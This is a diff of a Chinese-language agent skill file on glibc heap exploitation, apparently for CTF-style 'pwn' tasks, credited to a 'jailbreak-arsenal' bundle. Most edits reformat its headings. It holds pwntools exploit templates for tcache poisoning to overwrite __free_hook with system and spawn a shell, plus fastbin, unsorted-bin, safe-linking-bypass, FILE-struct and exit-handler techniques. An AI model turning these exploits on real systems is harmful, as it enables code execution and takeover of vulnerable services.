@@ -4,7 +4,6 @@ description: 从逆向走到可用利用 (Working Exploit) 的全链路工程化
 whenToUse: 从逆向走到可用利用 (Working Exploit) 的全链路工程化方法
 source: dsh-jailbreak-arsenal@1.7.0 bundled_skills（已按本仓格式改写，非照抄）
 ---
-# pwn-chain
 
 ## 适用范围
 
@@ -156,17 +155,17 @@ Step 6: 远程稳定化
 
 ## 堆利用（上游深度参考）
 
-# 堆类利用 (Heap Pwn)
+###### 堆类利用 (Heap Pwn)
 
-## glibc 版本差异（必看）
+###### glibc 版本差异（必看）
 
 堆利用的所有技术都跟 glibc 版本强绑定。先确认版本：
 
 ```bash
 ./libc.so.6 | head -1
-# GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31.
+###### GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31.
 
-# 或 strings
+###### 或 strings
 strings ./libc.so.6 | grep "GNU C Library"
 ```
 
@@ -180,14 +179,14 @@ strings ./libc.so.6 | grep "GNU C Library"
 | 2.34 | **移除 __free_hook / __malloc_hook** | 改走 FILE struct / exit handlers |
 | 2.35+ | 进一步加固 | 同 2.34，FILE 路径仍可用 |
 
-## tcache poisoning (2.27 - 2.31)
+###### tcache poisoning (2.27 - 2.31)
 
-### 原理
+###### 原理
 
 tcache 是 per-thread cache，每个 size class 一条链表，单链表（只有 fd）。
 double free 检查在 2.29 之前只看链表头是不是自己，不看遍历。
 
-### 利用模板（2.27 - 2.31）
+###### 利用模板（2.27 - 2.31）
 
 ```python
 from pwn import *
@@ -210,8 +209,8 @@ def show(idx):
     p.sendlineafter(b'idx: ', str(idx).encode())
     return p.recvline().strip()
 
-# === Step 1: leak libc base ===
-# 申请大于 tcache 范围的 chunk（>0x408），free 进 unsorted bin，残留 main_arena 指针
+###### === Step 1: leak libc base ===
+###### 申请大于 tcache 范围的 chunk（>0x408），free 进 unsorted bin，残留 main_arena 指针
 for i in range(8):
     add(i, 0x80)
 add(8, 0x80)  # 防止合并
@@ -223,24 +222,24 @@ leak = u64(show(9).ljust(8, b'\x00'))
 libc.address = leak - 0x3ebca0  # main_arena+96 偏移，glibc 2.27 amd64
 log.success(f'libc = {hex(libc.address)}')
 
-# === Step 2: tcache poisoning → 写 __free_hook ===
+###### === Step 2: tcache poisoning → 写 __free_hook ===
 add(10, 0x30)
 add(11, 0x30)
 free(10)
 free(11)
-# 用 UAF 改 chunk11 的 fd 指向 __free_hook
+###### 用 UAF 改 chunk11 的 fd 指向 __free_hook
 edit(11, p64(libc.sym['__free_hook']))
 add(12, 0x30)  # 取出 chunk11
 add(13, 0x30, p64(libc.sym['system']))  # 取出来的就是 __free_hook 地址，写 system
 
-# 触发：free 一个内容为 "/bin/sh\x00" 的 chunk
+###### 触发：free 一个内容为 "/bin/sh\x00" 的 chunk
 add(14, 0x30, b'/bin/sh\x00')
 free(14)
 
 p.interactive()
 ```
 
-## safe-linking 绕过 (2.32+)
+###### safe-linking 绕过 (2.32+)
 
 ```text
 原理：tcache/fastbin 的 fd 写入时被 PROTECT_PTR 异或：
@@ -256,15 +255,15 @@ p.interactive()
 def protect_ptr(pos, ptr):
     return (pos >> 12) ^ ptr
 
-# leak heap base（unsorted bin 残留 / tcache fd 残留）
+###### leak heap base（unsorted bin 残留 / tcache fd 残留）
 heap_base = leaked_heap & ~0xfff
 
-# poisoning
+###### poisoning
 fake_fd = protect_ptr(heap_base + chunk_off, target_addr)
 edit(chunk_id, p64(fake_fd))
 ```
 
-## fastbin attack (传统，2.26 及之前为主)
+###### fastbin attack (传统，2.26 及之前为主)
 
 ```text
 关键点：
@@ -274,20 +273,20 @@ edit(chunk_id, p64(fake_fd))
 ```
 
 ```python
-# double free
+###### double free
 add(0, 0x60)
 add(1, 0x60)
 free(0)
 free(1)
 free(0)  # fastbin: 0 → 1 → 0
 
-# 把 fd 改成 fake chunk（要求 fake_addr + 8 处的 size 字节匹配 0x70）
+###### 把 fd 改成 fake chunk（要求 fake_addr + 8 处的 size 字节匹配 0x70）
 add(2, 0x60, p64(fake_addr))
 add(3, 0x60)
 add(4, 0x60)  # 取出 fake_addr 处的 chunk
 ```
 
-## unsorted bin attack（仅 2.28 及之前）
+###### unsorted bin attack（仅 2.28 及之前）
 
 ```text
 原理：写任意地址为 main_arena+88
@@ -296,16 +295,16 @@ add(4, 0x60)  # 取出 fake_addr 处的 chunk
 ```
 
 ```python
-# 申请 unsorted size chunk
+###### 申请 unsorted size chunk
 add(0, 0x100)
 add(1, 0x100)  # 防止 top consolidation
 free(0)
-# UAF 改 bk 指针为 target - 0x10
+###### UAF 改 bk 指针为 target - 0x10
 edit(0, p64(0) + p64(target - 0x10))
 add(2, 0x100)  # 从 unsorted 取出 → unlink → main_arena+88 写到 target
 ```
 
-## large bin attack
+###### large bin attack
 
 ```text
 原理：large bin 比 unsorted 多一层 fd_nextsize / bk_nextsize
@@ -313,7 +312,7 @@ add(2, 0x100)  # 从 unsorted 取出 → unlink → main_arena+88 写到 target
 高级技巧，常用于 House of Husk 等组合拳
 ```
 
-## House of XXX 速查
+###### House of XXX 速查
 
 | 名称 | 适用版本 | 核心思想 |
 |------|---------|---------|
@@ -327,7 +326,7 @@ add(2, 0x100)  # 从 unsorted 取出 → unlink → main_arena+88 写到 target
 | House of Cat | 2.34+ | _IO_wfile_seekoff vtable 利用，针对无 hook 版本 |
 | House of Apple | 2.34+ | _IO_wfile_jumps + setcontext gadget |
 
-## 真实利用步骤（通用 4 步）
+###### 真实利用步骤（通用 4 步）
 
 ```text
 Step 1: leak heap base
@@ -348,9 +347,9 @@ Step 4: getshell
   - 2.34+: setcontext + 53 gadget → rop chain in heap → execve
 ```
 
-## libc 2.34+ 没有 hook 之后的替代路径
+###### libc 2.34+ 没有 hook 之后的替代路径
 
-### FILE struct 攻击（_IO_2_1_stdout_ / _IO_2_1_stderr_）
+###### FILE struct 攻击（_IO_2_1_stdout_ / _IO_2_1_stderr_）
 
 ```text
 目标：当程序调用 puts/printf 时，最终走到 _IO_file_xsputn → _IO_OVERFLOW → 调用 vtable
@@ -361,7 +360,7 @@ Step 4: getshell
 触发：任何 puts/printf/abort/exit 都会冲刷 stderr
 ```
 
-### Exit handlers (`__exit_funcs` / `tls_dtor_list`)
+###### Exit handlers (`__exit_funcs` / `tls_dtor_list`)
 
 ```text
 原理：__run_exit_handlers 遍历 __exit_funcs 链表，调用每个 dtor
@@ -369,31 +368,31 @@ Step 4: getshell
 注意：2.34+ 加了 PTR_DEMANGLE，需要 leak tls 里的 fs:[0x30] guard 值才能伪造
 ```
 
-### tls_dtor_list（更现代）
+###### tls_dtor_list（更现代）
 
 ```text
 __call_tls_dtors 遍历，结构类似，同样要绕过 PTR_DEMANGLE
 适用：程序退出时会走，比 FILE 攻击更通用
 ```
 
-## pwndbg / GEF 堆调试命令
+###### pwndbg / GEF 堆调试命令
 
 ```text
-# pwndbg
+###### pwndbg
 heap              # 显示当前 arena 所有 chunk
 bins              # 显示 tcache / fastbin / unsorted / small / large bins
 tcache            # 单独看 tcache
 find_fake_fast <addr> <size>  # 找一个能用作 fake chunk 的 fd 写入点
 vis_heap_chunks   # 可视化堆布局
 
-# GEF
+###### GEF
 heap chunks
 heap bins fast
 heap bins tcache
 heap chunk <addr>
 ```
 
-## 典型 pwntools 模板（heap menu 题）
+###### 典型 pwntools 模板（heap menu 题）
 
 ```python
 from pwn import *
@@ -403,7 +402,7 @@ libc = ELF('./libc.so.6')
 
 p = process('./vuln') if not args.REMOTE else remote('host', 1337)
 
-# IO 包装
+###### IO 包装
 def menu(choice):
     p.sendlineafter(b'choice:', str(choice).encode())
 
@@ -428,10 +427,10 @@ def edit(idx, data):
     p.sendlineafter(b'idx:', str(idx).encode())
     p.sendafter(b'data:', data)
 
-# === 后续根据漏洞类型选择技术栈 ===
+###### === 后续根据漏洞类型选择技术栈 ===
 ```
 
-## 注意事项
+###### 注意事项
 
 - **glibc 版本是第一性问题** — 同一个二进制配 2.27 libc 和 2.34 libc，利用路径完全不同
 - **tcache 容量 = 7**（每个 size class）— 喷射够 7 个才会溢出到 unsorted/fastbin
